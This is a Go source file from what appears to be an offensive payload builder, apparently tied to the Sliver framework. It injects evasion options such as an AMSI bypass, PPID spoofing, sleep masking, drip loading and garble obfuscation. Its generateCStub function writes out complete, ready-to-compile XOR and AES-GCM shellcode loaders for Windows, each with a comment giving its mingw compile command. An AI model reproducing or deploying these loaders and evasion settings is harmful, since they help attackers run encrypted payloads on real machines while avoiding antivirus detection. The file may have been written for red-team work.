	// L2-1: Sleep mask mode
	// Always inject SleepMaskMode so GUI selection overrides config.go default
	if cfg.SleepMaskMode != "" {
		add("SleepMaskMode", cfg.SleepMaskMode)
	}
	// L2-2: AMSI bypass method — always inject so GUI selection overrides config.go default
	if cfg.AMSIMethod != "" {
		add("AMSIMethod", cfg.AMSIMethod)
	}
	// L2-3: PPID spoof target
	if cfg.PPIDSpoof != "" {
		add("PPIDSpoof", cfg.PPIDSpoof)
	}
	// L2-4: Transform obfuscate
	if cfg.TransformObfuscate {
		add("TransformObfuscate", "true")
	}
	// L2-5: Drip loading
	if cfg.DripChunkSize > 0 {
		add("DripChunkSize", fmt.Sprintf("%d", cfg.DripChunkSize))
		add("DripDelayMs", fmt.Sprintf("%d", cfg.DripDelayMs))
	}
	return strings.Join(flags, " ")
}

// buildCmd returns an exec.Cmd for "go build" or "garble -seed=random build".
func buildCmd(gobin string, useGarble bool, args ...string) *exec.Cmd {
	if useGarble {
		// garble [garble-flags] build [go-flags] [packages]
		allArgs := append([]string{"-seed=random", "build"}, args...)
		return exec.Command(gobin, allArgs...)
	}
	return exec.Command(gobin, append([]string{"build"}, args...)...)
}

func findGoOrGarble(useGarble bool) (string, error) {
	if useGarble {
		gopath, _ := exec.Command("go", "env", "GOPATH").Output()
		candidates := []string{
			"garble",
			filepath.Join(strings.TrimSpace(string(gopath)), "bin", "garble"),
			"/home/kali/go/bin/garble",
		}
		for _, c := range candidates {
			found := false
			if path, err := exec.LookPath(c); err == nil {
				c = path
				found = true
			} else if _, err := os.Stat(c); err == nil {
				found = true
			}
			if !found {
				continue
			}
			// Pre-flight: garble checks Go version compatibility on any real
			// build invocation. Run it with a dummy package — the version
			// check fires before package resolution so any compatibility
			// error surfaces immediately.
			out, _ := exec.Command(c, "build", "_garble_preflight_").CombinedOutput()
			if s := string(out); strings.Contains(s, "is too old") ||
				strings.Contains(s, "please upgrade") ||
				strings.Contains(s, "is too new") ||
				strings.Contains(s, "aren't available") {
				return "", fmt.Errorf("garble incompatible con el Go instalado (%s).\n"+
					"Instala la versión correcta: go install mvdan.cc/garble@v0.15.0\nDetalle: %s",
					goVersion(), strings.TrimSpace(s))
			}
			return c, nil
		}
		return "", fmt.Errorf("garble no encontrado; instala: go install mvdan.cc/garble@latest")
	}
	return findGo()
}

// goVersion returns the current Go toolchain version string (e.g. "go1.25.0").
func goVersion() string {
	out, err := exec.Command("go", "version").Output()
	if err != nil {
		return "unknown"
	}
	// "go version go1.25.0 linux/amd64" → "go1.25.0"
	parts := strings.Fields(string(out))
	if len(parts) >= 3 {
		return parts[2]
	}
	return strings.TrimSpace(string(out))
}

func findGo() (string, error) {
	candidates := []string{"go", "/home/kali/.sliver/go/bin/go"}
	for _, c := range candidates {
		if path, err := exec.LookPath(c); err == nil {
			return path, nil
		}
		if _, err := os.Stat(c); err == nil {
			return c, nil
		}
	}
	return "", fmt.Errorf("go no encontrado; instala golang-go")
}

func normalizeArch(arch string) string {
	switch strings.ToLower(arch) {
	case "x86", "386", "i386", "i686":
		return "386"
	case "arm64", "aarch64":
		return "arm64"
	default:
		return "amd64"
	}
}

func absDir(root, dir string) string {
	if filepath.IsAbs(dir) {
		return dir
	}
	return filepath.Join(root, dir)
}

func projectRoot() string {
	if exe, err := os.Executable(); err == nil {
		if root := findGoMod(filepath.Dir(exe)); root != "" {
			return root
		}
	}
	wd, _ := os.Getwd()
	if root := findGoMod(wd); root != "" {
		return root
	}
	return wd
}

func findGoMod(start string) string {
	dir := start
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	return ""
}

// generateCStub returns a C source file that loads and executes the encrypted shellcode.
// Compile with: x86_64-w64-mingw32-gcc stub_<method>.c -o loader.exe -mwindows [-lbcrypt]
func generateCStub(key []byte, method, encFilename string) string {
	keyHex := toHexBytes(key)

	switch method {
	case "xor":
		return fmt.Sprintf(`/* XOR shellcode loader
   Compile: x86_64-w64-mingw32-gcc stub_xor.c -o loader.exe -mwindows
   Place loader.exe + %s in the same directory, then run loader.exe */
#include <windows.h>
static unsigned char key[]={%s};
#define KEY_LEN (sizeof(key))
int main(void){
    HANDLE hF=CreateFileA("%s",GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if(hF==INVALID_HANDLE_VALUE)return 1;
    DWORD sz=GetFileSize(hF,NULL);
    unsigned char*sc=(unsigned char*)VirtualAlloc(NULL,sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    DWORD r;ReadFile(hF,sc,sz,&r,NULL);CloseHandle(hF);
    for(DWORD i=0;i<sz;i++)sc[i]^=key[i%%KEY_LEN];
    DWORD old;VirtualProtect(sc,sz,PAGE_EXECUTE_READ,&old);
    HANDLE h=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)sc,NULL,0,NULL);
    if(h)WaitForSingleObject(h,INFINITE);
    return 0;
}
`, encFilename, keyHex, encFilename)

	case "aes":
		return fmt.Sprintf(`/* AES-GCM shellcode loader
   Compile: x86_64-w64-mingw32-gcc stub_aes.c -o loader.exe -mwindows -lbcrypt
   Place loader.exe + %s in the same directory, then run loader.exe */
#include <windows.h>
#include <bcrypt.h>
static unsigned char key[]={%s};
#define KEY_LEN (sizeof(key))
#define NONCE_SZ 12
#define TAG_SZ   16
int main(void){
    HANDLE hF=CreateFileA("%s",GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if(hF==INVALID_HANDLE_VALUE)return 1;
    DWORD fsz=GetFileSize(hF,NULL);
    unsigned char*buf=(unsigned char*)LocalAlloc(LMEM_FIXED,fsz);
    DWORD r;ReadFile(hF,buf,fsz,&r,NULL);CloseHandle(hF);
    unsigned char*nonce=buf;
    DWORD ct_len=fsz-NONCE_SZ-TAG_SZ;
    unsigned char*tag=buf+NONCE_SZ+ct_len;
    unsigned char*ct=buf+NONCE_SZ;
    BCRYPT_ALG_HANDLE hAlg;
    BCryptOpenAlgorithmProvider(&hAlg,BCRYPT_AES_ALGORITHM,NULL,0);
    BCryptSetProperty(hAlg,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0);
    BCRYPT_KEY_HANDLE hKey;
    BCryptGenerateSymmetricKey(hAlg,&hKey,NULL,0,key,KEY_LEN,0);
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
    BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce=nonce;ai.cbNonce=NONCE_SZ;
    ai.pbTag=tag;ai.cbTag=TAG_SZ;
    unsigned char*plain=(unsigned char*)VirtualAlloc(NULL,ct_len,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    ULONG plen=0;
    BCryptDecrypt(hKey,ct,ct_len,&ai,NULL,0,plain,ct_len,&plen,0);
    BCryptDestroyKey(hKey);BCryptCloseAlgorithmProvider(hAlg,0);
    DWORD old;VirtualProtect(plain,plen,PAGE_EXECUTE_READ,&old);
    HANDLE h=CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)plain,NULL,0,NULL);
    if(h)WaitForSingleObject(h,INFINITE);
    return 0;
}
`, encFilename, keyHex, encFilename)
	}
	return ""
}

func toHexBytes(b []byte) string {
	parts := make([]string, len(b))
	for i, v := range b {
		parts[i] = fmt.Sprintf("0x%02x", v)
	}
	return strings.Join(parts, ",")
}
